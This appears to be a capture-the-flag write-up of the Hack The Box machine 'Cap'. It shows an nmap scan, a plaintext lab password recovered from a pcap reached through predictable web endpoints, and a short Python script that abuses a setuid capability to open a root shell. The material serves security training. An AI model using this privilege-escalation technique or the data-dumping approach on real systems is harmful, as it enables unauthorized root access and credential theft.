# Cap

## Cap

## Credentials

| User   | Password        | Note        |
| ------ | --------------- | ----------- |
| nathan | Buck3tH4TF0RM3! | http server |
|        |                 |             |
|        |                 |             |

## Enumeration

### Nmap scan

```bash
# Nmap 7.91 scan initiated Sun Jun 27 05:37:25 2021 as: nmap -p21,22,80 -sV -sC -oA nmap/detalied 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 27 Jun 2021 09:50:03 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 27 Jun 2021 09:49:58 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 27 Jun 2021 09:49:58 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port80-TCP:V=7.91%I=7%D=6/27%Time=60D846DD%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,105F,"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20
SF:Sun,\\x2027\\x20Jun\\x202021\\x2009:49:58\\x20GMT\\r\\nConnection:\\x20close\\r\\
SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20193
SF:86\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20class=\\"no-js\\"\\x20lang=\\"en\\">\\
SF:n\\n<head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\"utf-8\\">\\n\\x20\\x20\\x20\\x2
SF:0<meta\\x20http-equiv=\\"x-ua-compatible\\"\\x20content=\\"ie=edge\\">\\n\\x20\\
SF:x20\\x20\\x20<title>Security\\x20Dashboard</title>\\n\\x20\\x20\\x20\\x20<meta\\
SF:x20name=\\"viewport\\"\\x20content=\\"width=device-width,\\x20initial-scale=
SF:1\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"shortcut\\x20icon\\"\\x20type=\\"image
SF:/png\\"\\x20href=\\"/static/images/icon/favicon\\.ico\\">\\n\\x20\\x20\\x20\\x20<
SF:link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/css/bootstrap\\.min\\.css\\">
SF:\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/css/fon
SF:t-awesome\\.min\\.css\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20
SF:href=\\"/static/css/themify-icons\\.css\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=
SF:\\"stylesheet\\"\\x20href=\\"/static/css/metisMenu\\.css\\">\\n\\x20\\x20\\x20\\x2
SF:0<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/css/owl\\.carousel\\.min\\.
SF:css\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\"stylesheet\\"\\x20href=\\"/static/c
SF:ss/slicknav\\.min\\.css\\">\\n\\x20\\x20\\x20\\x20<!--\\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Sun,\\x2
SF:027\\x20Jun\\x202021\\x2009:49:58\\x20GMT\\r\\nConnection:\\x20close\\r\\nConten
SF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20HEAD,\\x20OPTIONS,\\x
SF:20GET\\r\\nContent-Length:\\x200\\r\\n\\r\\n")%r(RTSPRequest,121,"HTTP/1\\.1\\x2
SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20text
SF:/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n<html>\\n\\x20\\x20<head>\\n\\x20\\x20
SF:\\x20\\x20<title>Bad\\x20Request</title>\\n\\x20\\x20</head>\\n\\x20\\x20<body>\\
SF:n\\x20\\x20\\x20\\x20<h1><p>Bad\\x20Request</p></h1>\\n\\x20\\x20\\x20\\x20Invali
SF:d\\x20HTTP\\x20Version\\x20&#x27;Invalid\\x20HTTP\\x20Version:\\x20&#x27;RTSP
SF:/1\\.0&#x27;&#x27;\\n\\x20\\x20</body>\\n</html>\\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20S
SF:un,\\x2027\\x20Jun\\x202021\\x2009:50:03\\x20GMT\\r\\nConnection:\\x20close\\r\\n
SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\
SF:r\\n\\r\\n<!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\"-//W3C//DTD\\x20HTML\\x203\\.2\\x20
SF:Final//EN\\">\\n<title>404\\x20Not\\x20Found</title>\\n<h1>Not\\x20Found</h1>
SF:\\n<p>The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20ser
SF:ver\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20ch
SF:eck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.</p>\\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Sun Jun 27 05:39:36 2021 -- 1 IP address (1 host up) scanned in 131.31 seconds

```

### data endpoint of http server

<figure><img src="../../.gitbook/assets/Pasted_image_20210627114456.png" alt=""><figcaption></figcaption></figure>

With predictable endpoints was possible to bruteforce the rest of data and dump credentials from user `nathan` from pcap file

<figure><img src="../../.gitbook/assets/Pasted_image_20210627115001.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

With password acquired from `pcap` file login as `nathan` via SSH was possible.

<figure><img src="../../.gitbook/assets/Pasted_image_20210627115210.png" alt=""><figcaption></figcaption></figure>

### Python with setuid capability

setuid capability allow to change effective uid of user to other one, so this allow to impersonate root uid and run program with root privileges.

<figure><img src="../../.gitbook/assets/Pasted_image_20210627120315.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted_image_20210627120434 (1).png" alt=""><figcaption></figcaption></figure>

#### Exploit code

```python
root@cap:/dev/shm# cat soviet.py
import os

os.setuid(0)
os.system('bash -i')

```